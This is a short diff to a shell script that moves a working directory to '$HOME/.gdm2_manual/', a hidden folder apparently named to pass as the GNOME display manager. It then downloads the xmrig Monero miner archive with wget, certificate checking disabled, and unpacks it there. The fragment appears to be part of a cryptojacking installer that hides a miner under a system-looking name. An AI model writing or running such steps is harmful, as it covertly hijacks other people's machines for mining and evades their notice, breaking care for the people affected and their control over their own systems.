@@ -1,5 +1,5 @@
-mkdir .gdm_manual
-cd .gdm2_manual
+mkdir $HOME/.gdm2_manual/
+cd $HOME/.gdm2_manual/
 
 wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 tar xf $HOME/.gdm2_manual/xmrig.tar.gz
